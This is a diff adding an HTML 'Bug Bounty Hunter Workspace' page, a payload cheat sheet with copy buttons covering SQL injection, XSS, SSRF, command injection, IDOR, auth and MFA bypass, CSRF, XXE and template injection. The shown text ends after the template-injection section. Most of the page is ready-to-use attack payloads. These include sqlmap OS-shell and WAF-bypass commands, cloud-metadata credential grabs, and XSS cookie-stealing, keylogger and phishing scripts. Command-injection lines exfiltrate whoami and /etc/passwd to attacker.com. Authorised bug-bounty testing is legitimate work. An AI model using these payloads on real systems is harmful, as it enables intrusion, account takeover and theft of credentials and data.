@@ -1,0 +1,1254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bug Bounty Hunter Workspace</title>
+<style>
+  :root {
+    --bg: #0d1117; --surface: #161b22; --border: #30363d;
+    --text: #e6edf3; --muted: #8b949e; --accent: #58a6ff;
+    --green: #3fb950; --red: #f85149; --yellow: #d29922;
+    --orange: #db6d28; --purple: #bc8cff; --cyan: #39d353;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; }
+
+  /* Header */
+  .header { background: var(--surface); border-bottom: 1px solid var(--border); padding: 16px 24px; display: flex; align-items: center; gap: 16px; position: sticky; top: 0; z-index: 100; }
+  .header h1 { font-size: 20px; font-weight: 600; }
+  .header h1 span { color: var(--accent); }
+  .header .badge { background: var(--green); color: #000; font-size: 11px; padding: 2px 8px; border-radius: 12px; font-weight: 600; }
+  .search-box { margin-left: auto; background: var(--bg); border: 1px solid var(--border); border-radius: 6px; padding: 6px 12px; color: var(--text); width: 300px; font-size: 14px; }
+  .search-box:focus { outline: none; border-color: var(--accent); }
+
+  /* Layout */
+  .container { display: flex; height: calc(100vh - 57px); }
+  .sidebar { width: 240px; background: var(--surface); border-right: 1px solid var(--border); overflow-y: auto; padding: 12px 0; flex-shrink: 0; }
+  .sidebar .section-title { font-size: 11px; font-weight: 600; text-transform: uppercase; color: var(--muted); padding: 8px 16px 4px; letter-spacing: 0.5px; }
+  .sidebar a { display: block; padding: 6px 16px; color: var(--muted); text-decoration: none; font-size: 13px; cursor: pointer; transition: all 0.15s; }
+  .sidebar a:hover, .sidebar a.active { color: var(--text); background: rgba(88,166,255,0.1); }
+  .sidebar a .dot { display: inline-block; width: 6px; height: 6px; border-radius: 50%; margin-right: 8px; }
+  .dot-critical { background: var(--red); }
+  .dot-high { background: var(--orange); }
+  .dot-medium { background: var(--yellow); }
+  .dot-low { background: var(--green); }
+  .dot-info { background: var(--accent); }
+
+  .main { flex: 1; overflow-y: auto; padding: 24px 32px; }
+
+  /* Cards */
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 20px; overflow: hidden; }
+  .card-header { padding: 14px 18px; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 10px; cursor: pointer; user-select: none; }
+  .card-header:hover { background: rgba(88,166,255,0.05); }
+  .card-header h3 { font-size: 15px; font-weight: 600; flex: 1; }
+  .card-header .severity { font-size: 11px; padding: 2px 8px; border-radius: 12px; font-weight: 600; text-transform: uppercase; }
+  .sev-critical { background: var(--red); color: #fff; }
+  .sev-high { background: var(--orange); color: #fff; }
+  .sev-medium { background: var(--yellow); color: #000; }
+  .sev-low { background: var(--green); color: #000; }
+  .card-header .toggle { color: var(--muted); font-size: 18px; transition: transform 0.2s; }
+  .card-header.open .toggle { transform: rotate(90deg); }
+  .card-body { padding: 18px; display: none; }
+  .card-body.open { display: block; }
+
+  /* Code blocks */
+  .code-block { background: var(--bg); border: 1px solid var(--border); border-radius: 6px; margin: 10px 0; position: relative; }
+  .code-block .code-header { display: flex; justify-content: space-between; align-items: center; padding: 6px 12px; border-bottom: 1px solid var(--border); font-size: 12px; color: var(--muted); }
+  .code-block pre { padding: 12px; overflow-x: auto; font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; font-size: 13px; line-height: 1.5; }
+  .code-block code { color: var(--cyan); }
+  .copy-btn { background: var(--border); border: none; color: var(--text); padding: 3px 10px; border-radius: 4px; cursor: pointer; font-size: 11px; transition: all 0.15s; }
+  .copy-btn:hover { background: var(--accent); color: #000; }
+  .copy-btn.copied { background: var(--green); color: #000; }
+
+  /* Steps */
+  .step { display: flex; gap: 12px; margin: 10px 0; }
+  .step-num { width: 24px; height: 24px; background: var(--accent); color: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; flex-shrink: 0; margin-top: 2px; }
+  .step-content { flex: 1; }
+  .step-content strong { color: var(--accent); }
+
+  /* Notes */
+  .note { background: rgba(88,166,255,0.1); border-left: 3px solid var(--accent); padding: 10px 14px; border-radius: 0 6px 6px 0; margin: 10px 0; font-size: 13px; }
+  .note.warn { background: rgba(210,153,34,0.1); border-color: var(--yellow); }
+  .note.danger { background: rgba(248,81,73,0.1); border-color: var(--red); }
+
+  /* Scratchpad */
+  .scratchpad { width: 100%; min-height: 200px; background: var(--bg); border: 1px solid var(--border); border-radius: 6px; color: var(--text); font-family: monospace; font-size: 13px; padding: 12px; resize: vertical; }
+  .scratchpad:focus { outline: none; border-color: var(--accent); }
+
+  /* Tabs */
+  .tabs { display: flex; gap: 0; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
+  .tab { padding: 10px 20px; cursor: pointer; color: var(--muted); border-bottom: 2px solid transparent; font-size: 14px; transition: all 0.15s; }
+  .tab:hover { color: var(--text); }
+  .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* Tags */
+  .tag { display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 12px; margin: 2px; background: var(--border); color: var(--muted); }
+  .tag.tool { background: rgba(188,140,255,0.2); color: var(--purple); }
+  .tag.pay { background: rgba(63,185,80,0.2); color: var(--green); }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 8px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
+
+  /* Payload table */
+  .payload-table { width: 100%; border-collapse: collapse; margin: 10px 0; font-size: 13px; }
+  .payload-table th, .payload-table td { padding: 8px 12px; border: 1px solid var(--border); text-align: left; }
+  .payload-table th { background: var(--bg); color: var(--muted); font-weight: 600; }
+  .payload-table td { font-family: monospace; font-size: 12px; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>🎯 <span>Bug Bounty</span> Workspace</h1>
+  <span class="badge">LIVE</span>
+  <input type="text" class="search-box" placeholder="🔍 Search vulnerabilities, commands, payloads..." id="searchBox" onkeyup="filterContent()">
+</div>
+
+<div class="container">
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <div class="section-title">Critical / High</div>
+    <a href="#sqli"><span class="dot dot-critical"></span>SQL Injection</a>
+    <a href="#xss"><span class="dot dot-critical"></span>XSS (Cross-Site Scripting)</a>
+    <a href="#ssrf"><span class="dot dot-critical"></span>SSRF</a>
+    <a href="#rce"><span class="dot dot-critical"></span>RCE</a>
+    <a href="#idor"><span class="dot dot-high"></span>IDOR</a>
+    <a href="#auth-bypass"><span class="dot dot-high"></span>Auth Bypass</a>
+
+    <div class="section-title">Medium</div>
+    <a href="#csrf"><span class="dot dot-medium"></span>CSRF</a>
+    <a href="#xxe"><span class="dot dot-medium"></span>XXE</a>
+    <a href="#ssti"><span class="dot dot-medium"></span>SSTI</a>
+    <a href="#open-redirect"><span class="dot dot-medium"></span>Open Redirect</a>
+    <a href="#lfi"><span class="dot dot-medium"></span>LFI / Path Traversal</a>
+    <a href="#cors"><span class="dot dot-medium"></span>CORS Misconfiguration</a>
+
+    <div class="section-title">Low / Info</div>
+    <a href="#info-disclosure"><span class="dot dot-low"></span>Info Disclosure</a>
+    <a href="#clickjacking"><span class="dot dot-low"></span>Clickjacking</a>
+    <a href="#headers"><span class="dot dot-info"></span>Security Headers</a>
+
+    <div class="section-title">Tools & Setup</div>
+    <a href="#recon"><span class="dot dot-info"></span>Recon Commands</a>
+    <a href="#tools"><span class="dot dot-info"></span>Tool Install</a>
+    <a href="#wordlists"><span class="dot dot-info"></span>Wordlists</a>
+
+    <div class="section-title">Workspace</div>
+    <a href="#scratchpad"><span class="dot dot-info"></span>Scratchpad</a>
+    <a href="#checklist"><span class="dot dot-info"></span>Checklist</a>
+  </div>
+
+  <!-- Main Content -->
+  <div class="main">
+
+    <!-- Tabs -->
+    <div class="tabs">
+      <div class="tab active" onclick="switchTab('vulns')">Vulnerabilities</div>
+      <div class="tab" onclick="switchTab('recon')">Recon & Tools</div>
+      <div class="tab" onclick="switchTab('workspace')">Workspace</div>
+    </div>
+
+    <!-- ==================== VULNS TAB ==================== -->
+    <div class="tab-content active" id="tab-vulns">
+
+      <!-- SQL INJECTION -->
+      <div class="card" id="sqli">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-critical">Critical</span>
+          <h3>💉 SQL Injection (SQLi)</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Attacker injects malicious SQL queries into input fields, URLs, or headers to manipulate the database.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Find injectable parameters</strong> — Look for user input: search boxes, login forms, URL params, headers, cookies, API body.</div></div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>Test for injection</strong> — Send these basic payloads and observe errors/timeouts:</div></div>
+
+          <div class="code-block">
+            <div class="code-header"><span>Basic Detection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>' OR 1=1--
+" OR 1=1--
+' OR '1'='1
+1' AND SLEEP(5)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; WAITFOR DELAY '0:0:5'--
+1' AND BENCHMARK(10000000,SHA1('test'))--</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">3</div><div class="step-content"><strong>Identify DB type</strong> from error messages:</div></div>
+          <div class="code-block">
+            <div class="code-header"><span>DB Fingerprinting</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># MySQL
+' AND 1=CONVERT(int,@@version)--
+' UNION SELECT NULL,NULL,@@version--
+
+# PostgreSQL
+' AND 1=CAST(version AS int)--
+';SELECT version()--
+
+# MSSQL
+' AND 1=convert(int,@@version)--
+';WAITFOR DELAY '0:0:5'--
+
+# Oracle
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">4</div><div class="step-content"><strong>Use sqlmap for automation:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>sqlmap Commands</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Basic scan
+sqlmap -u "https://target.com/page?id=1" --batch --dbs
+
+# POST request
+sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch --dbs
+
+# With cookies
+sqlmap -u "https://target.com/api?id=1" --cookie="session=abc123" --batch --dbs
+
+# From Burp request file
+sqlmap -r request.txt --batch --dbs
+
+# Dump specific table
+sqlmap -u "https://target.com?id=1" -D dbname -T users --dump
+
+# Shell access
+sqlmap -u "https://target.com?id=1" --os-shell
+
+# Bypass WAF
+sqlmap -u "https://target.com?id=1" --tamper=space2comment,between --random-agent --batch</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">5</div><div class="step-content"><strong>Extract data manually (Union-based):</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Union Injection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Find column count
+' ORDER BY 1--
+' ORDER BY 2--
+... keep going until error
+
+# Find visible columns
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,NULL,NULL--
+' UNION SELECT 1,2,NULL--
+
+# Extract data
+' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> Blind SQLi and time-based SQLi on authenticated endpoints often pay more than error-based on public pages.</div>
+        </div>
+      </div>
+
+      <!-- XSS -->
+      <div class="card" id="xss">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-critical">Critical</span>
+          <h3>🌐 XSS (Cross-Site Scripting)</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Injecting malicious scripts into web pages viewed by other users. Three types: Reflected, Stored, DOM-based.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Identify input points</strong> — URL params, form fields, HTTP headers reflected in page, URL fragments (#), postMessage handlers.</div></div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>Test with detection payloads:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>XSS Detection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Basic detection
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+
+# Event handler variants
+" onmouseover=alert(1) "
+' onfocus=alert(1) autofocus='
+&lt;details open ontoggle=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;
+
+# Filter bypass
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
+&lt;img src=x onerror="&#97;lert(1)"&gt;
+&lt;svg&gt;&lt;script&gt;alert&#40;1&#41;&lt;/script&gt;
+javascript:alert(1)
+data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Template literal escape
+${alert(1)}
+{{constructor.constructor('alert(1)')()}}
+
+# Polyglot
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">3</div><div class="step-content"><strong>DOM-based XSS sources & sinks:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>DOM XSS</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Sources (where attacker input comes from)
+document.URL
+document.documentURI
+document.referrer
+location.href / location.search / location.hash
+window.name
+postMessage data
+
+# Sinks (where dangerous output happens)
+eval()
+setTimeout() / setInterval()
+document.write() / document.writeln()
+element.innerHTML / element.outerHTML
+element.src / element.href / element.action
+$.html() / $.append()</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">4</div><div class="step-content"><strong>Exploit — Cookie theft / Session hijack:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>XSS Exploitation</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Exfiltrate cookies
+&lt;script&gt;new Image().src="https://attacker.com/c?c="+document.cookie&lt;/script&gt;
+
+# Keylogger
+&lt;script&gt;document.onkeypress=function(e){new Image().src="https://attacker.com/k?k="+e.key}&lt;/script&gt;
+
+# Phishing — inject login form
+&lt;script&gt;document.body.innerHTML='&lt;h1&gt;Session Expired&lt;/h1&gt;&lt;form action=https://attacker.com/steal&gt;&lt;input name=user placeholder=Email&gt;&lt;input name=pass type=password placeholder=Password&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;'&lt;/script&gt;
+
+# Redirect to attacker page
+&lt;script&gt;location='https://attacker.com'%253C/script%253E&lt;/script&gt;</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Stored XSS on authenticated pages with PII access = $$$$$. DOM XSS via postMessage on origin-binding endpoints is also high-value.</div>
+        </div>
+      </div>
+
+      <!-- SSRF -->
+      <div class="card" id="ssrf">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-critical">Critical</span>
+          <h3>🔗 SSRF (Server-Side Request Forgery)</h3>
+          <span class="tag pay">$$$: Critical Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Tricking the server into making requests to internal resources, cloud metadata endpoints, or other internal services.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Find URL-fetching features</strong> — Webhooks, file import via URL, PDF generation, URL preview, image loading, RSS feed parsing, API integrations.</div></div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>Test basic SSRF:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>SSRF Payloads</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Basic internal scan
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://[::1]
+
+# Cloud metadata (AWS)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/identity/security-credentials/ec2-instance
+
+# Cloud metadata (GCP)
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+
+# Cloud metadata (Azure)
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# Internal services
+http://127.0.0.1:8080
+http://127.0.0.1:3000
+http://127.0.0.1:6379    # Redis
+http://127.0.0.1:3306    # MySQL
+http://127.0.0.1:27017   # MongoDB
+http://127.0.0.1:9200    # Elasticsearch</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">3</div><div class="step-content"><strong>Bypass filters:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>SSRF Bypass</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Decimal IP
+http://2130706433          # 127.0.0.1 in decimal
+http://0x7f000001          # 127.0.0.1 in hex
+http://0177.0.0.1          # 127.0.0.1 in octal
+
+# IPv6
+http://[::ffff:127.0.0.1]
+http://[0000::0001]
+
+# URL encoding
+http://%31%32%37%2e%30%2e%30%2e%31
+http://127.0.0.1%2523.attacker.com   # URL parse confusion
+
+# DNS rebinding
+http://rbnd.gl   # Resolves to 127.0.0.1
+
+# Redirect bypass
+http://attacker.com/redirect?url=http://169.254.169.254
+
+# Protocol tricks
+file:///etc/passwd
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall  # Redis</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">4</div><div class="step-content"><strong>Use ssrfmap or Gopherus:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>SSRF Tools</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># ssrfmap
+ssrfmap -r request.txt -p url -m portscan
+ssrfmap -r request.txt -p url -m readfiles
+
+# Gopherus (generate gopher payloads)
+python gopherus.py --exploit redis
+python gopherus.py --exploit fastcgi
+python gopherus.py --exploit mysql</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> SSRF to AWS metadata with IAM credentials = auto-critical. SSRF that reads /etc/passwd = high. Always try to exfiltrate cloud credentials.</div>
+        </div>
+      </div>
+
+      <!-- RCE -->
+      <div class="card" id="rce">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-critical">Critical</span>
+          <h3>💀 RCE (Remote Code Execution)</h3>
+          <span class="tag pay">$$$$_$: Critical Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Executing arbitrary commands on the server. The most impactful web vulnerability.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Find command injection points</strong> — Any input that goes into system commands, file operations, or code execution.</div></div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>Test for OS command injection:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Command Injection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Basic injection
+; id
+| id
+`id`
+$(id)
+|| id
+&& id
+
+# Blind injection (time-based)
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+
+# Data exfiltration
+; cat /etc/passwd
+| cat /etc/passwd
+; curl https://attacker.com/$(whoami)
+; wget https://attacker.com/$(cat /etc/passwd | base64)
+
+# Newline injection
+%0aid
+%0acat /etc/passwd
+
+# Windows
+& whoami
+| whoami
+&& whoami</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">3</div><div class="step-content"><strong>Language-specific RCE:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Language-Specific RCE</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Python
+__import__('os').system('id')
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# Node.js
+require('child_process').execSync('id')
+${process.mainModule.require('child_process').execSync('id')}
+
+# PHP
+system('id');
+exec('id');
+`id`;
+$_GET['cmd'];
+
+# Java
+Runtime.getRuntime().exec("id");
+
+# Ruby
+`id`
+system("id")</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> RCE is almost always Critical. Even blind command injection (time-based) on a P1 program pays top dollar. Document impact clearly.</div>
+        </div>
+      </div>
+
+      <!-- IDOR -->
+      <div class="card" id="idor">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-high">High</span>
+          <h3>🔑 IDOR (Insecure Direct Object Reference)</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Accessing resources by manipulating object identifiers (IDs) in API calls without proper authorization checks.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Map API endpoints</strong> — Look for predictable IDs in URLs, params, and API bodies: user IDs, order numbers, file paths, invoice IDs.</div></div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>Test by changing IDs:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>IDOR Testing</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Sequential IDs
+GET /api/users/123 → change to /api/users/124
+GET /api/invoices/456 → change to /api/invoices/457
+
+# UUID prediction
+GET /api/files/a1b2c3d4-e5f6-7890-abcd-ef1234567890
+
+# Parameter manipulation
+{"user_id": 123} → {"user_id": 124}
+{"order_id": "ORD-001"} → {"order_id": "ORD-002"}
+
+# Two-account test
+1. Login as user A, note endpoint + ID
+2. Login as user B, try same endpoint + ID
+3. If you see user A's data = IDOR
+
+# Encoded IDs
+Base64: eyJ1c2VyX2lkIjogMTIzfQ== → {"user_id": 124}
+JWT: modify payload claims</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">3</div><div class="step-content"><strong>IDOR hunting checklist:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>IDOR Checklist</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>□ Profile endpoints (/api/users/{id})
+□ File download (/download?file=report_123.pdf)
+□ Invoice/billing (/api/invoices/{id})
+□ Support tickets (/api/tickets/{id})
+□ Messages/notifications (/api/messages/{id})
+□ Admin panels (/admin/users/{id})
+□ Export endpoints (/export?user_id=123)
+□ Webhook configs (/api/webhooks/{id})
+□ API keys (/api/keys/{id})</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- AUTH BYPASS -->
+      <div class="card" id="auth-bypass">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-high">High</span>
+          <h3>🔐 Authentication Bypass</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Bypassing login, MFA, or authorization checks to access protected resources.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Test common bypasses:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Auth Bypass Payloads</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Default credentials
+admin:admin  |  admin:password  |  admin:123456
+root:root    |  test:test       |  guest:guest
+
+# SQLi auth bypass
+admin'--  |  admin' OR '1'='1  |  ' OR 1=1--
+
+# JWT manipulation
+# Change alg to none
+{"alg":"none","typ":"JWT"}.{"role":"admin"}. 
+
+# JWT key confusion (RS256 → HS256)
+# Sign with the public key
+
+# Header injection
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-For: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>MFA bypass techniques:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>MFA Bypass</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Response manipulation
+# Complete login, intercept MFA response
+# Change {"success": false} → {"success": true}
+
+# Cookie manipulation
+# After first factor, copy session cookie
+# Try accessing /dashboard directly
+
+# Brute force 2FA
+# 2FA codes are usually 4-6 digits
+# 0000-9999 = 10000 attempts (if no lockout)
+
+# Backup codes
+# Try: 000000, 111111, admin, backup</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- CSRF -->
+      <div class="card" id="csrf">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🔄 CSRF (Cross-Site Request Forgery)</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Forcing a logged-in user to perform unwanted actions without their knowledge.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Identify state-changing actions</strong> — Change password, email, transfer money, update profile, delete account, add admin user.</div></div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>Generate PoC:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>CSRF PoC</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>&lt;!-- Auto-submit form --&gt;
+&lt;form method="POST" action="https://target.com/change-email"&gt;
+  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+
+&lt;!-- Via image tag (GET requests) --&gt;
+&lt;img src="https://target.com/api/delete?user_id=123" style="display:none"&gt;
+
+&lt;!-- XMLHttpRequest --&gt;
+&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://target.com/api/transfer", true);
+xhr.withCredentials = true;
+xhr.send("to=attacker&amount=10000");
+&lt;/script&gt;</code></pre>
+          </div>
+
+          <div class="note">💡 Check for CSRF tokens, SameSite cookies, Origin/Referer header validation.</div>
+        </div>
+      </div>
+
+      <!-- XXE -->
+      <div class="card" id="xxe">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>📄 XXE (XML External Entity)</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Exploiting XML parsers that process external entities, leading to file reads, SSRF, or DoS.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Find XML endpoints</strong> — SOAP APIs, SVG upload, DOCX/XLSX processing, RSS feeds, SAML authentication.</div></div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>Test payloads:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>XXE Payloads</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/shadow"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+
+# Blind XXE (out-of-band)
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://attacker.com/steal?data=file:///etc/passwd"&gt;
+]&gt;
+
+# SVG XXE (upload as image)
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE svg [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;text x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- SSTI -->
+      <div class="card" id="ssti">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>📝 SSTI (Server-Side Template Injection)</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Injecting template syntax that gets executed server-side, potentially leading to RCE.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Detect SSTI:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>SSTI Detection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Math test (works in most templates)
+{{7*7}}           → 49
+${7*7}            → 49
+#{7*7}            → 49
+<%= 7*7 %>        → 49
+
+# If math evaluates, try:
+{{7*'7'}}         → 49 (Jinja2)
+${7*7}            → 49 (FreeMarker/Twig)</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>Exploit by template engine:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>SSTI Exploitation</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Jinja2 (Python/Flask)
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# Twig (PHP)
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+# FreeMarker (Java)
+&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; ${ex("id")}
+
+# Tornado (Python)
+{% import os %}{{os.popen('id').read()}}</code></pre>
+          </div>
+        </div>
+      </div>
+
